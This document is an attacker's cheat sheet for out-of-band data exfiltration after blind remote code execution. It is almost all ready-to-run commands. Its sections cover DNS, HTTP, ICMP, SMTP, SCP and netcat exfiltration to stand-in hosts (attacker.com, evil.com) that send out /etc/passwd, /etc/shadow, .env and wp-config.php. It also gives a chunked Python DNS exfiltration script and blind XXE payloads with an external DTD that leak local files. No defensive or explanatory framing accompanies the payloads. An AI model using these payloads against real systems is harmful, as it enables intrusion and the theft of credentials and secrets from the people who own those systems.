# Blind RCE — OOB (Out of Band) Exfiltration Guide
## Last Updated: Mon Jul 06 2026

## DNS Exfiltration
# Basic: extract command output via DNS
curl http://attacker.com/$(whoami)
nslookup $(hostname).attacker.com
dig +short $(whoami).attacker.com A

# File exfiltration via DNS
# Split file into chunks, encode as subdomains
cat /etc/passwd | base64 -w0 | while read line; do
  for i in $(seq 0 32 ${#line}); do
    chunk=${line:$i:32}
    nslookup ${chunk}.attacker.com
  done
done

# One-liner DNS exfil
curl -s "http://attacker.com/$(cat /etc/passwd | base64 -w0 | tr '+/' '-_').attacker.com"

## HTTP Exfiltration
# Simple HTTP exfil
curl http://attacker.com/$(whoami)
wget http://attacker.com/$(hostname)
python3 -c "import urllib.request; urllib.request.urlopen('http://attacker.com/'+__import__('os').popen('id').read().strip())"

# File exfil via HTTP POST
curl -X POST http://attacker.com/exfil -d @/etc/passwd
curl -X POST http://attacker.com/exfil --data-urlencode "data@/etc/passwd"

# Multi-file exfil
for f in /etc/passwd /etc/shadow /etc/hosts .env wp-config.php; do
  [ -f "$f" ] && curl -X POST http://attacker.com/exfil -d "$f=$(base64 -w0 $f 2>/dev/null)"
done

## ICMP Exfiltration
ping -c 1 $(whoami).attacker.com
ping -c 1 $(echo "data" | base64).attacker.com

## SMTP Exfiltration
# If mail command available
mail -s "exfil" attacker@evil.com < /etc/passwd

## SSH Exfiltration
scp /etc/passwd attacker@evil.com:/tmp/

## DNS via nslookup/dig (most reliable for blind RCE)
# Simple confirmation
nslookup $(id).attacker.com
dig $(cat /etc/hostname).attacker.com A +short

## Python blind RCE with OOB
python3 -c "
import socket, base64
data = open('/etc/passwd','rb').read()
encoded = base64.b64encode(data).decode()
# DNS exfil in chunks
for i in range(0, len(encoded), 63):
    chunk = encoded[i:i+63]
    try:
        socket.gethostbyname(f'{chunk}.attacker.com')
    except:
        pass
"

## Blind XXE OOB
"""
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/exfil">
  %xxe;
]>
<root>&xxe;</root>
"""

## Blind XXE with file exfil
"""
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
"""
## evil.dtd contents:
## <!ENTITY % payload SYSTEM "file:///etc/passwd">
## <!ENTITY % param1 '<!ENTITY &#x25; send SYSTEM "http://attacker.com/?data=%payload;">'>
## %param1;

## OOB detection via delay
# Time-based: if you see delay on sleep, try OOB
sleep 5
timeout 5 bash -c 'echo "test" | nc attacker.com 4444' 2>/dev/null

